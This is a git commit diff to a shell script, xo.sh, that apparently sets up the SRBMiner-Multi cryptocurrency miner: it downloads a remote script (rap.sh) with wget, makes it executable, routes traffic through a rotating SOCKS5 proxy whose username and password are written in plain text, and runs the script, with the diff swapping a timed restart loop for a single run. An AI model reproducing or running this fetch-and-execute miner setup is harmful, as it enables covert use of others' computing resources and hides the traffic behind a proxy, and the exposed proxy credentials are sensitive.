fa2a219479551dfb36529ad1051de8c8c3181b34
hunsunyo <98655233+hunsunyo@users.noreply.github.com>
2022-01-29 21:27:07 +0530

    Update xo.sh

--- xo.sh
+++ xo.sh
@@ -5,8 +5,8 @@ cd SRBMiner-Multi-0-8-9
 wget https://github.com/ahansura/srb/raw/main/rap.sh
 chmod +x rap.sh
 export http_proxy="socks5://djutybpn-rotate:vo7hn8ayc8s5@p.webshare.io:80/"
-while[1];do
-timeout 600 ./rap.sh
-sleep 20
-done
-sleep 9999
+
+./rap.sh
+
+
+
